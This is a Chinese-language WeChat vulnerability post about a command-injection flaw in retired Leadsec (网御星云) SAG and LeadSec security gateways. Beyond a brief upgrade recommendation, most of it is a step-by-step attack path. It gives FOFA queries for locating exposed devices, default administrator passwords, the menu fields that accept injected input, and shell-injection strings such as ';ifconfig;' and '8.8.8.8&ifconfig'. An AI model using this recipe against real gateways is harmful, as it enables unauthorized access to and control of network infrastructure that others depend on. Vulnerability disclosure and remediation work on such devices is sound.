> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YLgAZAO40PY8gX6Fh8D15w)

**描述**

  

网御星云安全网关有两个系列，SAG 系列和 Power V-VPN 系列，SAG 系列是比较老的一款产品，于 2016 年 9 月正式退市，但现网还存在不少未替换的 SAG 系列，该系列 V3.1.3.1 及以前版本存在后台命令执行漏洞。  

  

  

  

  

  

**影响范围**

  

网御星云安全网关 SAG 系列和 LeadSec 系列 <=V3.1.3.1 版本

  

  

  

  

  

防护建议  

  

及时进行换新安全网关防护，旧版本及时下架。

  

  

  

  

  

LeadSec 系列漏洞：

FOFA：

```
icon_hash="-948153991"
```

利用弱口令 (yyds)：

账号：administrator   密码：administrator  

漏洞点位于：

网关管理 -> 网络工具，在目的主机处填写：  

```
;ifconfig;
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibBOeVZ0Wueu8ejAmePqaNH9IMvLhj1NxcibHM6iceOZqFGlVhoRDKmHNbDQxicIxNiaQGKzPMoM02Kc4A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibBOeVZ0Wueu8ejAmePqaNH93ibG6qeCC54H7KEJcmFBVzsZSmfUd2RsS3G9uWmgYYCSOTxjlp0aypA/640?wx_fmt=png)

网御星云安全网关系列：

FOFA：

```
title="网御 安全网关"
```

利用弱口令 (yyds)：

账号：administrator   密码：leadsec@7766  

漏洞点位于：

状态监控 -> 网络测试 ->ping 处输入：

```
8.8.8.8&ifconfig
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibBOeVZ0Wueu8ejAmePqaNH9g9o99UvtvrCCQcibNoFtKUT6KRJAibS382P5iaPr1ViaFyRsUNZGQOQd1Q/640?wx_fmt=png)

老旧的退役设备请及时替换，不要给黑客留下机会。  

最后再说一下漏洞文库 wiki.xypbk.com 已经添加授权访问

获取授权方式为后台回复：文库授权  

    为防止黑产份子的非法利用漏洞，不给国家安全添麻烦，本站从此开启授权访问，形式以每人单独授权发放，限量 1000 人，请勿分享您获取的账号密码，账号密码具都采用随机生成的 32 位 MD5，还请牢记。

    如若因漏洞利用产生重大影响，会根据登录 IP、请求内容、申请授权等信息进行查证，查证后将对号主进行追责，故不要分享账号，终害己身。  

    虽然比较麻烦了些，但会稍微对黑产份子有一些限制，保证了本站安全，也保证国家安全。同时有些敏感东西也能第一时间放出来了，还请大家谅解。

    同时本站承诺永远不会出现买卖账号等利益相关的事情，本站永不割韭菜，永久免费检索，坚决抵制安全圈的歪风邪气。

    最后，若大家对此有意见请后台留言，本站将及时改正，若内容有侵犯您的权益，请及时提出，进行删除处理。  

    本站能坚持多久全看大家是否滥用，内容若更新较慢也请谅解，本人有工作有生活，会尽量坚持更新的。

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看